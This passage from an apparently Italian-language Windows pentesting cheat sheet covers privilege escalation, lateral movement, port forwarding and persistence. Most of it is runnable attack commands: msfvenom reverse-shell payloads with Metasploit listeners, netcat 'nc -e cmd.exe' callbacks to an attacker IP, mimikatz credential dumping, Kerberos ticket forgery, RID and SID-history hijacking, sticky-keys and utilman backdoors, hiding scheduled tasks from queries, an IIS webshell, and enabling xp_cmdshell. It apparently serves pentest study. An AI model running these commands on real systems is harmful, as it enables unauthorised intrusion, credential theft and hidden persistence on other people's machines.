      nc -lnvp <porta> #riaspriamo un listener per la seconda revshell che verrà utilizzata per l'utente SYSTEM
<!---->
     C:\<path>\RoguePotato.exe -r <ip> -e "<path eseguibile>" -l 9999 #comando da utilizzare nella prima revshell che tramite l'eseguibile RoguePotato otterremo il SYSTEM
<!---->

- __Scheduled Tasks:__

_Vettori di priviliege escalation possono essere task creati da utenti ma mal configurati_

_Comandi:_
<!---->
    schtasks /query /tn <nome task> /fo list /v #comando per ottenere info su un task
<!---->
    Task to Run: #parametro che indica cosa runna il task 
<!---->
    Run as User: #parametro che indica che user lo runna
<!---->
     icacls <Path eseguibile nel parametro Task to run> #andiamo a vedere i permessi che abbiamo sull'eseguibile
<!---->
     echo c:\<path nostro eseguibile> -e cmd.exe <ip> <porta> > <path da sostituire del parametro Task to run> #comando che in questo caso inserisce una revshell
<!---->
     schtasks /run /tn vulntask #comando per avviare il task
<!---->

- __Privilegio SeTakeOwnerShip:__

_Questo privilegio permette di prendere il controllo di ogni oggetto del sistema, incluso file,chiavi di registro o servizi è molto probabile che possa essere utilizzato per prendere di mira oggetti che runnano come SYSTEM_

_Comandi:_ 
<!---->
    whoami /priv #comando per vedere i propri privilegi
<!---->
    takeown /f C:<path eseguibile> #comando che permette di prenderne il controllo
<!---->   
    icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F 
    #Avendo il controllo non per forza abbiamo i permessi necessari, ma comuqnue con il SeTakeOwnerShip possiamo darceli con il seguente comando
<!---->  
    copy cmd.exe <nome eseguibile> #comando per sostituire l'eseguibile 
<!---->  

- __Unpatched Software:__

_Nella macchina target, possono esserci benissimo software non aggiornati all'ultima versione che possono essere vettori di priviliege escalation_

_Comandi:_
<!---->  
    wmic product get name,version,vendor #comando per listare software e info, non funziona sempre per tutti i programmi
<!---->  
### tools:

 - [winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) = tool molto potente per cercare possibili privesc

 - [PrivescCheck](https://github.com/itm4n/PrivescCheck) = alternativa a WINpeas se non si vuole eseguire un file binario

 - [Wesng](https://github.com/bitsadmin/wesng) = python script meno rumoroso rispetto a winpeas

 _N.B prima di startare wesng utilizzare il comando __"wes.py --update"__ per aggiornare il db, poi runnare il comando __"systeminfo"__ ed infine per avviare lo script utilizzare il        seguente comando __"wes.py systeminfo.txt"___

### Lateral movements:

##### Lanciare comandi da remoto:

- __Psexec64:__

_Caricando sulla macchina che abbiamo o se gia presente il tool psexec64.exe (integrato nella suite sysinternal di windows), permette di poter lanciare comandi da remoto, richiede di far parte degli Administrator group_

_Comandi:_
<!---->
       psexec64.exe \\<ip macchina> -u <user> -p <password> -i <commando> #comando per lanciare da remoto, i doppi backslash sono per quando utilizzamo SMB sennò basta mettere ip normale
<!---->
- __WinRM:__

_WinRm permette di poter utilizzare una shell o lanciare comandi powershell sempre da remoto, il gruppo richiesto è quello dei Remote Managemnet Users:_ 

_Comandi:_
<!---->
        $username = '<user>';
        $password = '<passowrd>';
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
        $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; #comando per creare l'oggetto PSSCredential
<!---->       
        Enter-PSSession -Computername <ip> -Credential $credential #comando per entrate nella sessione
<!---->       
        Invoke-Command -Computername <ip> -Credential $credential -ScriptBlock {whoami} #comando per lanciare altri comandi da remoto
<!---->
- __SC.exe:__

_sc.exe permette di creare processi da remoto e lo fa tramite DCE/RPC:_

 1) connessione alla porta 135 che è quella del EPM(Endpoint Mapper) un servizio del protocollo DCE/RPC che indica indirizzo e la porta per un servizio, EPM.

 2) EPM indica ip e porta (range da 49152 a 65535) del SVCCTL (Service Control Manager Interface) APi per comunicare con il service control manager

 2.2) se la connessione tramite RPC fallisce il client prova tramite SMB named pipes o SMB con Netbios.

 _Comandi:_
<!-- -->
       sc.exe \\<ip> create <nome servizio> binPath= "<path binario>" #comando per creare il servizio
<!-- -->       
       sc.exe \\<ip> start <nome servizio> #comando per startarlo
<!-- -->       
       sc.exe \\<ip> stop <nome servizio> #comando per stopparlo
<!-- -->       
       sc.exe \\<ip> delete <nome servizio> #comando per eliminarl9
<!-- -->

- __Task scheduler:__

_Tramite schtasks possiamo creare dei tasks da remoto che a determinato tempo si ripetono, gruppo richiesto Administrators group_

_Comandi:_
<!-- -->
       schtasks /s <ip> /RU "SYSTEM" /create /tn "<nome task>" /tr "<comando>" /sc ONCE /sd 01/01/1970 /st 00:00 #comando per creare tasj
<!-- -->     
       schtasks /s <ip> /run /TN "<nome task>"  #comando per avviarlo
<!-- -->       
       schtasks /S <ip> /TN "<nome task>" /DELETE /F #comando per eliminarlo
<!-- -->

- __WMI:__

_WMI(Windows Management Instrumentation) è utilizzato per la gestione delle risorse locali e di rete, possiamo persino creare processi,servizi e schedule tasks e fa tutto questo da remoto tramite 2 protocolli DCOM (RPC over IP) o Wsman (WinRM); gruppo richiesto Administrators group._

_Porte 135, 49152-65535 (DCERPC) DCOM è un'estensione del DCERPC_

_5985/TCP (WinRM HTTP) o 5986/TCP (WinRM HTTPS)_

_Comandi per creare una sessione:_
<!-- -->
       $username = '<user>';
       $password = '<passowrd>';
       $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
       $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; #comando per creare l'oggetto PSSCredential
<!-- -->
       $Opt = New-CimSessionOption -Protocol DCOM #comando che crea un'oggetto CIM in cui è specificato il protocollo DCOM 
       $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop #comando che crea le session CMI
       #CMI è strettamente correlato con WMI
<!-- -->

_Comandi per creare un processo da remoto:_
<!-- -->
       $Command = "<comando da inserire>"; #variabile contente il processo
ES:
powershell.exe -Command Set-Content -Path C:\Windows\hello.txt -Value hello
<!-- -->
       Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
       CommandLine = $Command } #comando per creare il processo
<!-- -->   
       wmic.exe /user:<nome utente> /password:<password> /node:<ip> process call create <comando>" #stesso comando ma per CMD
<!-- -->   

_Comandi per creare un servizio da remoto:_
<!-- --> 
       Invoke-CimMethod -CimSession <sessione> -ClassName Win32_Service -MethodName Create -Arguments @{
       Name = "<nome servizio";
       DisplayName = "<nome>";
       PathName = "<comando>";
       ServiceType = [byte]::Parse("16"); # Win32OwnProces
       StartMode = "Manual"
       } #comando con relativi dettagli per creare un servizio
<!-- --> 
       $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'" #variabile che contiene informzioni per creare l'handle del servizio
<!-- --> 
       Invoke-CimMethod -InputObject $Service -MethodName StartService/StopService/Delete #comando che preso l'handle e avvia/ferma/elimina il servizio
<!-- --> 
_Comandi per creare un task da remoto:_
<!-- --> 
       $Command = "<comando o eseguibile>" 
       $Args = "<argomenti del comando>" #commando e argomenti vanno divisi e inseriti in variabili d'ambiente
<!-- -->        
       $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args # comando per lacreazione dell'azione dello schedule
<!-- -->        
       Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<nome task>" #commando per laregistrazione della task
<!-- -->        
       Start-ScheduledTask -CimSession $Session -TaskName "<nome task>" #comando che avvia il task
<!-- -->       
       Unregister-ScheduledTask -CimSession $Session -TaskName "<nome task>" #comando per eliminarlo
<!-- --> 

_Comandi per installare un nostro MSI installer:_ 
<!-- --> 
       Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<path installer>"; Options = ""; AllUsers = $false}
       #comando per insttalre un nostro MSI
<!-- --> 
       wmic /node:<ip> /user:<eventuale dominio>\<utente> product call install PackageLocation=<Path installer> #stesso comando ma per CMD
<!-- --> 

- __RDP hijacking:__

_RDP hijacking funziona se vi è una connessione RDP dove è chiusa ma non è stato fatto il logout e quindi solo con il reboot del server si chiude definitivamente e infine funziona sulle versioni di windows server 2016, nella 2019 richiede la password._

_Commandi:_
<!-- -->
      #runnato con privilegi di SYSTEM
      query user #query delle sessioni attive, se nell'output notiamo una sessione in state DISC significa che è vulnerabile
<!-- -->     
OUPUT di esempio:
<!-- -->
      USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
      administrator         rdp-tcp#6           3  Active          .  6/3/2023 5:09 AM
      serverAdmin                               4  Disc            .  6/7/2023 7:51 AM
<!-- -->
      tscon 4 /dest:rdp-tcp#6 #comando per dire di legare la sessione di id 4 all nostra che è la 3
<!-- -->
##### __Port Forwarding:__

_Tramite tecniche di port forwarding in diverse maniere è possibile fare pivoting, tra macchine target_

__N.B: si suppone che si abbia compromesso almeno una macchina per poter applicare le seguenti metodologie.__

- _SSH Tunneling:_

  1) _Remote port Forwarding:_
 
__N.B: i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso la nostra kali.__
  
_Comandi:_
<!-- -->
      useradd <nome user> -m -d <path directory user> -s <shell da utilizzare> #comando per creare un'utente sulla propria machine e verrà utilizzato per la connessione SSH
<!-- -->      
      passwd <password> #comando per impostare password
<!-- -->
      ssh <nome utente>@<ip> -R <porta aperta della propria machine>:<ip remoto>:<porta target> -N  #comando che si connette alla nostra macchina e che poi binda una porta remota con la        propria porta, -N per creare solo la connessione
<!-- -->
ES:

ssh user@3.2.1.9 -R 3389:3.2.2.2:3389 -N /3389 porta RDP/

xfreerdp /v:127.0.0.1 /u:user /p:passwd123

  2) _Local port Forwarding:_

__N.B: i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso la nostra kali.__

_Comandi:_
<!-- -->
       ssh <nome utente>@<ip> -L *:<porta della propria macchina>:<ip localhost target>:<porta target> -N #comando che si connetta alla nostra macchina, mette in ascolto tutte le                interfacce di rete disponibili e che poi binda la nostra porta con quella target
<!-- -->
       netsh advfirewall firewall add rule name="<nome regola>" dir=<specifica direzione> action=<azione> protocol=<protocollo> localport=<porta> #comando per modificare le regole del    
       firewall della nostra kali machine, a seconda del tunneling creato
<!-- -->
ES:

ssh user#3.2.1.9 -L *:80:127.0.0.1:80 -N

_Ci andremo a connettere prima alla nostra kali machine per poi creare un socket __"*.80"__ su tutte le interfaccie di rete disponibili che si collegano alla 80, per poi bindarla con __"127.0.0.1:80"__ la porta 80 della macchina su cui è stato lanciato il comando SSH con il proprio indirizzo quindi quello di loopback._

netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80

_Verrà creato una regola che permette connessioni in ingresso alla porta 80._

- _Socat Forwarding:_

_Socat può essere utilizzato quando SSH non è disponibile_

__N.B: va caricato sulla macchina compromessa e può essere maggiormente rilevabile rispetto al semplice SSH.
i comandi  utilizzati vengono lanciati dalla macchina compromessa verso la nostra kali.__
 
_Comandi:_
<!-- -->
       socat TCP4-LISTEN:<port macchina compromessa>,fork TCP4:<ip target>:<porta target> #comando per bindare una porta con socat e in seguito visitarla 	 
       tramite browser
<!-- -->
ES:

socat TCP4-LISTEN:3389,fork TCP4:3.5.4.3:3389

_Andremo a bindare la porta della 3389 della macchina compromessa alla 3389 del ip specificato, per poi poterla visitare tramite browser_

TCP4-LISTEN:80,fork TCP4:<ip_della_nostra_macchina>:80

_Andremo a bindare la porta 80 della macchina compromessa alla 80 della nostra kali machine._

##### Varie:

- __RBCD:__

_RBCD (Resource-Based Constrained Delegation) è una delle tre kerberos delegation, in questa delegation è il servizio a decidere a chi oggetto delegare_

_Comandi:_

_Il primo passo è enumerare il sistema per vedere eventuali delegazione e lo facciamo tramite powerview_
<!-- -->
     Import-Module .\PowerView.ps1 #comando per importare powerview
<!-- -->
     Get-NetUser -TrustedToAuth #comando powerview per vedere le delegazioni
<!-- -->
_Utilizziamo ora mimikatz per recuperare le credenziali dell'user che ha le delgation_
<!-- -->
     mimikatz.exe token::elevate #comando per impersonare SYSTEM
<!-- -->    
     mimikatz.exe lsadump::secrets #comando per recupere credenziali in chiaro
<!-- -->
_Ora utilizziamo [kekeo](https://github.com/gentilkiwi/kekeo), tool per convertire i ticket o injectarli_
<!-- -->
     tgt::ask /user:<utente> /domain:<dominio> /password:<password> #comando per creare TGT
<!-- -->
     tgs::s4u /tgt:<nome TGT creato>kirbi /user:<nome user da impersonare> /service:<nome servizio da impersonare> #comando per fare la TGS
<!-- -->
_Infine con mimikatz importiamo i ticket TGS e il gioco è fatto_
<!-- -->
     kerberos::ptt <nome ticket>.kirbi #comando per passare il ticket
<!-- -->
_Da qui in poi potremmo ora utilizzare il servizio tramite delegation_
<!-- -->
### Persistence:

_La persistence è la pratica di mantenere un'accesso alla macchina compromessa, perchè non è sempre e possibile rientrare con le stesse metodologie_

##### Gruppi:

__E' richiesto di avere un'account con privilegi__

_La prima tecnica di persistenza è quella di aggiungere un utente meno privilegiato ad un gruppo che invece abbia più permessi come l'administrators group, il backup operators group o il remote management users.
Asseconda del gruppo ci sono vantaggi e svantaggi, l'administrators da molti privilegi ma può dare nell'occhio, il backup operators ha meno privilegi ma può dumpare SAM e SYSTEM e vedere le chiavi di registro e il remote management users permette il controllo da remoto (RDP)_

_Comandi:_
<!-- -->
       net localgroup <nome gruppo> <nome utente> /add #comando CMD per aggiungere un utente al gruppo 
<!-- -->
_La connessione da remoto però innesca l'attivazione del __"LocalAccountTokenFilterPolicy"__ policy dell' [UAC](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#uac) che toglie i poteri d'amministratori, derivati dai gruppi se connessi da remoto_
<!-- -->
       reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 #comando per disattivare la 
       policy
<!-- -->
- __Gruppi annidati:__

_La tecnica consiste nel creare diversi gruppi dove di volta in volta aggiungiamo questi gruppi fasulli per poi aggiungere un gruppo come quello degli amministratori a questo nido di gruppi e infine aggiungere il nostro utente che avrà i privilegi del gruppo di amministratori_

_Comandi:_
<!-- -->
      New-ADGroup -Path "OU=<nome ou>,OU=<nome ou>,DC=<nome DC>,DC=<altro nome DC>,DC=<altro nome DC>" -Name "<nome gruppo>" -SamAccountName "<nome SAM>" -   
      DisplayName "<nome che vogliamo mostrare" -GroupScope Global -GroupCategory Security #comando per creare un gruppo
<!-- -->
 _Quindi creiamo quanti gruppi ci pare per poi aggiungere uno ad uno con questo comando_
<!-- -->
      Add-ADGroupMember -Identity "<nome SAM gruppo d'aggiungere>" -Members "<nome SAM gruppo annidato>" #comando per aggiungere un gruppo ad un altro gruppo
<!-- -->      
__Continuando ad aggiungere gruppo dentro ad altri gruppi poi va aggiunto un gruppo di amministratori o qualsiasi cosa si voglia__

_Aggiungimi l'user al gruppo iniziale_
<!-- -->
      Add-ADGroupMember -Identity "<nome SAM gruppo iniziale>" -Members "<nome SAM user>" #comando per aggiungere l'user ad un gruppo
<!-- -->
      Get-ADGroupMember -Identity "<nome gruppo admin>" #comando per controllare se l'user è nel gruppo di admin
<!-- -->
- __AdminSDHolder:__

_AdminSDHolder è un template container presente in ogni dominio che ogni 60 minuti tramite il processo SDProp applica la sua ACL a tutti i gruppi considerati protetti di cui ne fanno anche parte Domain admins, Administrators, Enterprise Admins, ecc..._

_Comandi:_ 
<!-- -->
     runas /netonly /user:<dominio>\<utente> cmd.exe #comando per aprire una nuova shell con l'utente selezionato
<!-- -->
     mmc #comando per aprire microsoft management console
<!-- -->
     File-> aggiungi/rimuovi snap-in-> Active directory Utenti e Computer-> AdminSDHolder-> click destro-> Proprietò-> sicurezza-> aggiungi->
     aggiungiamo il nostro utente-> controlli nomi-> permessi completi-> attendere 60 minuti e il nostro utente avrà il controllo completo sui gruppi protetti
     #passi per aggiungere l'user scelto da noi alla cartella AdminSDHolder con permessi completi
<!-- -->
_Esister altrimenti lo [script](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1) che può semplificarci la vita_

- __GPO (Group Policy Mangement):__

_il GPO si occupa del controllo delle policy di configurazione locale delle varie macchine all'interno dell'AD, per esempio ha il compito di tenere le configurazione dell'AV o quali script devono runnare al boot del computer_

_Due tecniche comuni per la persistence contro la GPO:_

 1) Restricted Group Membership: permette l'accesso ad ogni host nell'AD

 2) Logon Script Deployment: decisione su quale script runna ogni volta che il pc viene avviato, esempio una revshell

_Comandi:_

__N.B: I .bat sono più stabili con la GPO__

     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<porta> -f exe > <nome eseguibile>.exe #comando per creare un'eseguibile con all'interno   
     una revshell

     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <porta>;exploit"
     #comando per startare il listener sulla nostra machine

     mmc #comando per aprire il microsoft management console

     File-> aggiungimi/rimuovi snap-in-> GPO-> aggiungi-> cliccare su qualsiasi OU si voglia-> creare una GPO con qualsiasi nome-> click destro-> applica
     poi-> Group Policy Management Editor-> policies-> impostazioni finestre-> scripts-> Logon-< proprietà-> selezionare il nostro script con la revshell->
     applica e ok #passi completi per aggiungere la propria GPO policy che funziona ad ogni boot del pc

     andare sulla nostra OU selezionata-> delega-> click destro sul gruppo ottenuto con la revshell-> modifica impostazioni-> elimina,modifica sicurezza->
     click sugli altri gruppi e li rimuoviamo-> sicurezza-> avanzate-> rimuovi il propietario dai permessi-< sempre in sicurezza aggiungi clicchiamo->    
     aggiungiamo Domain computers-> gli diamo i permessi di lettura-> cliccliamo ok e rimuoviamo l'ultimo gruppo rimasto #passi completi per non fare leggere la      nostra GPO

##### Privilegi:

_I privilegi possono essere fonte di persistenza, in quanto vi sono alcuni di loro che danno più poteri del necessario_

- __SeBackupPriviliege/SeRestorePriviliege:__

_Sono due priviliegi che danno molto potere, __"SeBackupPriviliege"__ permette di leggere ogni file nel sistema invece __"SeRestorePriviliege"__ permette di scrivere ogni file del sistema, avendo tali poteri è possibile modificare qualsiasi cosa._

1) Modifica policy di sicurezza:

_Comandi:_
<!-- -->
      secedit /export /cfg <nome file>.inf #comando per esportare le policy di sicurezza locale
<!-- -->
_Avendola esportata potremmo aggiungere degli account nei diversi privilegi che vediamo scritti e poi ricaricarla nel sistema_
<!-- -->
      secedit /import /cfg <nome file>.inf /db config.sdb #comando che importa la nuova configurazione modificata nel database di sicurezza
<!-- -->
      secedit /configure /db config.sdb /cfg <nome file>.inf #comando che applica la configurazione importata nel database di sicurezza
<!-- -->
##### Servizi:

_La modifica di servizi già esistenti o la creazione di nuovi può essere utilizzato a nostro favore_

- __Backdoor nei servizi:__

_La modifica della path del binario a cui punta un servizio può essere utilizzata per la creazione di una backdoor_

_Comandi:_
<!-- -->
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe-service -o <nome eseguibile>.exe #commando che crea  un eseguibile con all'suo interno una revshell
<!-- -->
      sc.exe create <nome servizio> binPath= "<path dell'eseguibile>" start= auto #comando per creare un servizio che punti all'eseguibile
<!-- -->
      sc.exe start <nome servizio> #comando per avviare il servizio
<!-- -->

- __Modificare servizi:__

_La possibilità di modificare i servizi già presenti può essere utilizzato a nostro vantaggio e da meno nell'occhio_

_Comandi:_
<!-- -->
      sc.exe query state=all #comando per listare tutti i servizi
<!-- -->
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe-service -o <nome eseguibile>.exe #commando che crea  un eseguibile con all'suo        interno una revshell
<!-- -->
      sc.exe config <nome servizio da modificare> binPath= "<path dell'eseguibile>" start= auto obj= "<account che utlizza il servizio>" #comando per modificare       un servizio
<!-- -->   
###### File:

- __Eseguibili:__

_Un file eseguibile apre le porte a moltissime opzioni di persistenza come una piccola backdoor_

_Commandi:_
<!-- -->
      msfvenom -a x64 --platform windows -x <nome eseguibile utilizzato>.exe -k -p windows/x64/shell_reverse_tcp lhost=<ip> lport=<porta> -b "\x00" -f exe -o <nome nuovo eseguibile>.exe
      #comando per generare un eseguibile con al suo interno una revshell
<!-- -->

- __Shortcut file:__

_Anche le shortcut possono essere fonti di backdoor andandole a modificare_

_Comandi:_
<!-- -->
      Script.ps1:
      Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <ip> <porta>" #comando che runna un processo che si collega ad una dato ip e porta
      C:\Windows\System32\<nome eseguibile>.exe #avvio dell'eseguibile che verrà modificato
<!-- -->
      powershell.exe -WindowStyle hidden C:\Windows\Tools\script.ps1 #comando da sostituire alla destinazione del collegamento
<!-- -->
      shortcut-> proprietà-> destinazione -> script creato da noi #path per modificare il collegamento
<!-- -->

- __Hijacking ProgID:__

_Un file possiede una determinata estensione, bene è possibile andare a modificare il ProgID di quela file (Viene spiegato [qui](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#bypass-uac) cos'è il ProgID, nell'exploit con fodhelper)_

_Comandi:_
<!-- -->
      HKEY_LOCAL_MACHINE\SOFTWARE\classes\.<estensione> #path per vedere il nome del ProgID
<!-- -->
 ES: HKEY_LOCAL_MACHINE\SOFTWARE\classes\.txt  = txfile/txtlegacy
<!-- -->
      HKEY_LOCAL_MACHINE\SOFTWARE\classes\<nome ProgID>\shell\open\command #path dove troviamo l'eseguibile che viene ricercato ogni volta che apriamo una determinata estensione
<!-- -->     
      Script.ps1:
      Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <ip> <porta>" #comando che runna un processo che si collega ad una dato ip e porta
      C:\Windows\system32\<nome eseguibile>.exe  #comando che runna l'eseguibile
<!-- -->
       powershell.exe -WindowStyle hidden C:\Windows\Tools\script.ps1 #valore da cambiare al default value della chiave di registro
<!-- -->  
###### Registri:

_I registri sono una componente fondamentale in windows che se modificati a nostro vantaggio possono tornare molto utili_

- __Registri di avvio:__

_Il target sono questi sottoregistri di avvio:_

    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
    
__N.B: HKCU si applica solo all'utente corrente, HKLM si applica a tutti poi la key Run avvia gli eseguibili al suo interno ogni volta che vi è il login mentre RunOnce solo una volta.__

_Comandi:_
<!-- -->
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
<!-- -->
       Editor registri-> HKLM\Software\Microsoft\Windows\CurrentVersion\Run-> creiamo un value di tipo REG_EXPAND_SZ che punta al path del nostro eseguibile #passi per creare un value           che punti al nostro eseguibile

###### Varie:

__E' richiesto di avere un'account con privilegi__

- __Secure Descriptor (WinRM):__

_Possiamo permettere ad un nostro utente creato per la persistence di poter loggare da remoto tramite la modifica del secure desciptor_

_Comandi:_
<!-- -->
      Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI #comando per aprire graficamente il WinRM secure descriptor
<!-- -->
      selezionare l'utente -> controllo completo #path per applicare la modifiche
<!-- -->
- __RID Hijacking:__

_Il RID è un'identificativo numerico per i vari utenti ed è utilizzato dal LSASS infatti quando vi è un'accesso LSASS collega il RID di un utente ad un token di accesso dell'UAC.
Andando a fare l'Hijacking del RID un semplice utente può risultare come un admin_

_Comandi:_
<!-- -->
      Get-LocalUser | fl * #comando per ottenere info sugli utenti, specialmente per capire il RID dell'admin
<!-- -->
      PsExec64.exe -i -s regedit #comando per avviare regedit con privilegi di amministratore
<!-- -->
      HKLM\SAM\SAM\Domains\Account\Users\ #path per modificare i RID
<!-- -->
_Nella folder Users, potremmo notare diverse altre subfolder con numeri esadecimale, se convertiti in decimale possiamo ricavare il RID ottenuto con il comando in powershell; ora non ci rimane che selezionare la subfolder del nostro utente, andare al valore __"F"__ che conterrà il RID (storato in little-endian) e modificarlo con quello dell'admin_

ES:

Admin = RID(500) ->  Esadecimale(0x1F4) -> Subkey(000001F4)

UserMalevolo = RID(502) -> Esadecimale(0x1F6) -> Subkey(000001F6) -> Value F che verrà cambiato da (F6 10) in (F4 10)

_UserMalevolo una volta rieffettuato il login avrà i privilegi dell'admin_

- __SID History:__

_Una history dei SID che ha avuto un'utente con i relativi permessi di cui godeva_

_Comandi:_
<!-- -->
     Get-ADUser <nome utente> -properties sidhistory #comando che recupera la SID history
<!-- -->
     Get-ADGroup "<nome gruppo" #comando per recuperare il SID del gruppo che in seguito verrà utilizzato
<!-- -->
     Stop-Service -Name ntds -force #comando per fermare il servizio ntds, in quanto bisogna apportare delle modifiche al DB dell'AD
<!-- -->
_Ora entra in gioco un [tool](https://github.com/MichaelGrafnetter/DSInternals) che ci permette di modificare la SID history_
<!-- -->
     Add-ADDBSidHistory -SamAccountName '<nome SAM>' -SidHistory '<SID che vogliamo aggiungere>' -DatabasePath C:\Windows\NTDS\ntds.dit 
     #comando per aggiungere il SID al NTDS.dit
<!-- -->
     Start-Service -Name ntds #comando per riavviare il servizio ntds
<!-- -->
- __Task Scheduler:__

_Il Task scheduler oltre ad essere fonte di [priviliege escalation](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#privilege-escalation) è utilizzato nella persistence tramite la creazione a nuovo o modifica di un task già esistente può ritornarci molto utile_

_Comandi:_
<!-- --> 
      schtasks /create /sc minute /mo 10 /tn <nome task> /tr "<path programma o comando da eseguire" /ru <utente che lo esegue> #creazione di un task che si esegue ogni 10 minuti
<!-- --> 
      schtasks /query /tn <nome task> #comando per vedere lo stato del nostro task
<!-- --> 
_Vi è la possibilità di rendere un visibile un task, andando ad eliminare il suo secure descriptor(SD) nelle chiavi di registro._      
<!-- --> 
      regedit #comando per aprire regedit
<!-- --> 
      HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<nome task da modificare> #path dove si trova SD del task da eliminare
<!-- --> 
      SD #nome del valore da eliminare
<!-- --> 
_Andando a fare una query del nostro task potremmo vedere che vi sarà un errore del sistema che non lo troverà._

- __Cartella Startup:__

_Ogni utente in un sistema windows dispone di una propria cartella che quando viene effettuato il login avvia degli eseguibili, quindi con i permessi necessari potremmo inserire un nostro payload_

_Comandi:_
<!-- -->
      C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup #path della cartella
<!-- -->
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
<!-- -->
_Ora va passato sulla target machine e inserito nella path della cartella startup._

- __WinLogon:__

_WinLogon è, viene spiegato [qui](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/tree/main#processi-di-avvio)_

_WinLogon sfrutta delle chiavi di registro alla path __"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"__, e due sono i value interessanti __"UserInit"__ che ha il compito di caricare le preferenze dell'utente e __"Shell"__ che nella maggior parte dei casi punta a explorer.exe; aggiungendo una semplice virgola a __"Shell"__ possiamo fare in modo di avviare un nostro eseguibile_

_Comandi:_
<!-- -->
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
<!-- -->
       regedit -> HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit-> explore.exe, <path del nostro eseguibile> #passi per modificare la chiave shell
<!-- -->
_Altro metodo di persistenza quando si esegue il logon è andare alla seguente path __"HKCU\Environment"__ e creare una nostra variabile d'ambiente di nome __"UserInitMprLogonScript"__ che punti al nostro eseguibili e ogni volta che avviene un logon si avvierà._

- __Tasti Permanenti:__

_Quando viene premuto rapidamente per 5 volte di seguito il tasto SHIFT, windows aprira un'eseguibile di nome __"setch.exe"__, sostitunedolo avremmo la possibilità di eseguire un nostro eseguibile anche prima della schermata di login._

_Comandi:_
<!-- -->
      takeown /f C:\Windows\System32\sethc.exe #comando per prendere il controllo dell'eseguibile
<!-- -->
      icacls C:\Windows\System32\sethc.exe /grant Administrator:F #comando per darsi i permessi sull'eseguibile
<!-- -->
      copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe #sostituzione dell'eseguibile con un CMD con user SYSTEM
<!-- -->
- __Utilman:__

_Utilman è un'eseguibile che fornisce delle opzioni di accesso semplificato prima del login, anche in questo caso avendo i giusti permessi, possiamo sostituire l'eseguibile __"utilman.exe"__ con un __"cmd.exe"___

_Comandi:_
<!-- -->
      takeown /f C:\Windows\System32\utilman.exe #comando per prendere il controllo dell'eseguibile
<!-- -->
      icacls C:\Windows\System32\utilman.exe /grant Administrator:F #comando per darsi i permessi sull'eseguibile
<!-- -->
      copy c:\Windows\System32\utilman.exe C:\Windows\System32\sethc.exe #sostituzione dell'eseguibile con un CMD con user SYSTEM
<!-- -->
- __IIS:__

_Inserendeo una webshell all'interno della root del server IIS potremmo loggare come utente del servizio con i relativi privileggi annessi, tra cui uno molto importante [SeImpersonatePrivilege](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#misconfiguration-di-vario-tipo)_

_Comandi:_
<!-- -->
      move <nome webshell>.aspc C:\inetpub\wwwroot\ #comando per copiare la webshell nella root dell'IIS
<!-- -->
      icacls <nome webshell>.aspx /grant Everyone:F #comando per darsi il controllo totale sulla webshell
<!-- -->
      http://<ip target/<nome webshell>.aspx #Url per visitare e attivare la webshell
<!-- -->

- __Mysql:__

_Mysql è presente in molti sistemi e può essere utilizzato per i nostri scopi_

_Comandi:_
<!-- -->
      Microsoft SQL Server Management Studio-> accesso con le credenziali dell'user-> nuova query #path per avviare xp_cmdshell
<!-- -->      
_Query:_
<!-- -->
      sp_configure 'Show Advanced Options',1;
      RECONFIGURE;
      GO #query che attiva le opzioni avanzate
<!-- -->      
      sp_configure 'xp_cmdshell',1;
